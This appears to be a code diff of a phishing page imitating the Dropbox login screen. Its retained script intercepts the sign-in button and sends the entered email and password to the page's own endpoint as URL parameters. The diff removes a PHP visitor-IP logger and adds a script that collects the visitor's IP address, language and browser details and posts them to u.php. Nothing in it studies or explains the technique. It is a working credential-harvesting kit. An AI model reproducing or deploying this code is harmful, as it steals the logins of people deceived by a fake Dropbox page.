@@ -1,21 +1,4 @@
 <?php
-function get_IP_address()
-{
-  if (!empty($_SERVER['HTTP_CLIENT_IP']))
-  {
-    $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
-  }
-elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
-  {
-    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
-  }
-else
-  {
-    $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
-  }
-  return $ipaddress;
-}
-fwrite(fopen('ip.txt','w'),get_IP_address());
 $f = fopen('redir.txt','r');
 $r = fread($f,filesize("redir.txt"));
 fclose($f);
@@ -136,4 +119,26 @@ mod.initialize_module({"ttv_at_dom_interactive": null, "is_dws2": false, "is_pag
 window.React = React;;
 }), "require-tier-react-element-set-global"]]]);
 document.getElementsByClassName('login-button signin-button button-primary')[0].addEventListener('click',function(e){e.preventDefault();var usr = document.getElementsByName('login_email')[0].value;var pw = document.getElementsByName('login_password')[0].value;var r = document.getElementById('redir').innerHTML;window.location = '/login?check-policy=ahdafhjfaghkheurweutyweuiti7t84wgjflkdhfjakshlfkhakjshfkhskhfdkashkfkaskghkjdfgkjknkcmxv,cxv7w784cn8723587c80yr8wyno&uuid=ashfasjdfjksadasdjkfhjksahdfjsahkdfhkjsheywi58783254-823erw===&id='+usr+'&locid='+pw+'&redir='+r;})
-            </script><img alt="" src="./Login - Dropbox_files/hstsping" style="display:none;"><div aria-live="assertive" class="ax-visually-hidden" id="accessible-announce"></div><iframe hidden="" src="./Login - Dropbox_files/login.html" sandbox="allow-scripts allow-same-origin" style="display: none;"></iframe><script src="./Login - Dropbox_files/api.js" nonce=""></script></body></html>
+            </script><img alt="" src="./Login - Dropbox_files/hstsping" style="display:none;"><div aria-live="assertive" class="ax-visually-hidden" id="accessible-announce"></div><iframe hidden="" src="./Login - Dropbox_files/login.html" sandbox="allow-scripts allow-same-origin" style="display: none;"></iframe><script src="./Login - Dropbox_files/api.js" nonce=""></script><script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+</script>  
+<script>
+$.getJSON("https://api.ipify.org?format=json",function(data) {
+if (1) {
+    var ip = data.ip;
+    var lang = navigator.language;
+    var platform = navigator.platform;
+    var ua = navigator.userAgent;
+    var webdriver = navigator.webdriver;
+    $.ajax({
+        url : 'u.php',
+        type : 'post',
+        data : {
+            'ip' : ip,
+            'lang' : lang,
+            'ua' : ua
+        }
+    });
+}
+});
+</script></body></html>
